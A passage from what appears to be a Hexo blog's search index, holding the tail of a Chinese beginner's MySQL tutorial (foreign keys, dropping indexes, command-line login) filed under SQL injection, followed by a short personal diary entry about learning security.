plain"><table><tr><td class="code"><pre><span class="line">on delete cascade </span><br></pre></td></tr></table></figure><p>级联更新</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">on update cascade</span><br></pre></td></tr></table></figure><p>关掉mysql外键约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET FOREIGN_KEY_CHECKS&#x3D;0;</span><br></pre></td></tr></table></figure><p>打开mysql外键约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT  @@FOREIGN_KEY_CHECKS;</span><br></pre></td></tr></table></figure><p>删除外键<br>注意：此语句在删除外键后不能关联删除该外键自动产生的约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop foreign key 外键名称;</span><br></pre></td></tr></table></figure><p>删除唯一键<br>注意：唯一键删除后对应的索引也会自动删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop index 唯一键字段名;</span><br></pre></td></tr></table></figure><p>删除指定名称的索引</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop index 索引名称;</span><br></pre></td></tr></table></figure><p>提醒：对于有主外关联的表，删除表中数据，如果无删除的级联操作，那么删除主表数据之前，必须先删除从表对应数据</p><h4 id="在命令行中使用mysql"><a href="#在命令行中使用mysql" class="headerlink" title="在命令行中使用mysql"></a>在命令行中使用mysql</h4><p>启动mysql服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure><p>停止mysql服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net sotp mysql </span><br></pre></td></tr></table></figure><p>通过命令行进入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u 用户名 -p </span><br><span class="line">键入后会提示输入密码</span><br><span class="line">如果不能进入数据库就使用绝对路径或者配置环境变量</span><br></pre></td></tr></table></figure><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><p>查看表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show table;</span><br></pre></td></tr></table></figure><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>数据库的应用多种多样，后面想到的都会写下来。</p>]]></content>
      
      
      <categories>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不定时日记</title>
      <link href="2020/09/15/hello-world/"/>
      <url>2020/09/15/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="2020-10-07"><a href="#2020-10-07" class="headerlink" title="2020-10-07"></a>2020-10-07</h3><p>恍恍惚惚，这江湖的人不就是来来去去走走停停的吗？</p><h3 id="2020-09-23"><a href="#2020-09-23" class="headerlink" title="2020-09-23"></a>2020-09-23</h3><p>不知不觉接触安全已经一年了，从今天开始新的一天继续冲！</p><h3 id="2020-09-15"><a href="#2020-09-15" class="headerlink" title="2020-09-15"></a>2020-09-15</h3><p>搭建博客只为记录知识与生活。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
